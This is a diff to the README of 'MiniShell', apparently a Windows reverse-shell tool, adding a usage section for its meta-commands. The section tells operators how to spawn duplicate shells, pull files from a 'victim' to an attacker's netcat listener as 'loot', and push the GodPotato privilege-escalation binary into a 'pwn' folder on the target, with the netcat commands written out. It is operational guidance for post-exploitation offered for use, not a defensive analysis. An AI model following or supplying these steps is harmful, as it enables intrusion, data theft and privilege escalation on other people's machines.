@@ -4,9 +4,20 @@ Among them are:
 + file transfer
 + automatic reconnection attempt on connection loss
 + easy duplication of established shells
-+ easy choice/switch between cmd and powershell command interpreter
++ easy choice/switch between `cmd` and `powershell` command interpreter
 + features can be chosen at build time (can be stripped down to a minimal shell without extra features)
 
+# Usage
+`MiniShell` provides so-called meta-commands. These start with a colon (":"). Currently the supported meta-commands are:
++ `:exit` - kill the shell (it doesn't come back)
++ `:dup [[<host>] <port>]` - send a duplicate of the current shell (default to the same endpoint it is already connected to)
++ `:c ps` - connect to a new `powershell` command interpreter (useful if current command hangs)
++ `:c cmd` - same as above but with `cmd`
++ `:get [[<host>] <port>] <reomote-file>` - read the contents of `<remote-file>` and send it to `host:port` (by default the same endpoint already connected to)
+  + e.g. catch file on attack host like this: `nc -l 80 > myLoot.txt`
++ `:put [[<host>] <port>] <remote-file>`
+  + e.g. send file like this: `cat GodPotato-NET4.exe | nc -q 1 -lp 80`
+  + then retrieve file on victim like this `:put C:\windows\temp\pwn\GodPotato.exe` (assuming your shell is connected to port `80`, otherwise specify port)
 
 # Build
 + using Visual Studio 2022
